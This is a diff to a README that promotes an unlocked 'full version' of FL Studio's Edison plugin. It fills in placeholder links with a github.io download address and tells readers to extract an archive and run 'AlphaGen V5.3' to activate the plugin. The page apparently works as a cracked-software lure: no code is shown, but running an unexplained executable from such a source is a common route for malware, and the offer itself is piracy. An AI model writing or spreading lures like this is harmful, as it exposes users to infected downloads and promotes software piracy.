@@ -2,13 +2,13 @@
 
 Unlock the full version of Edison in FL Studio. Record, edit, slice, and process audio clips with professional precision inside your DAW.
 
-[![Download](https://img.shields.io/badge/Download-Edison_Full-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Edison_Full-blueviolet)](https://edison-full-version-fl-studio.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://edison-full-version-fl-studio.github.io/.githubE)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure plugin settings  
 4. ✅ Launch FL Studio and start using Edison Full with complete feature access
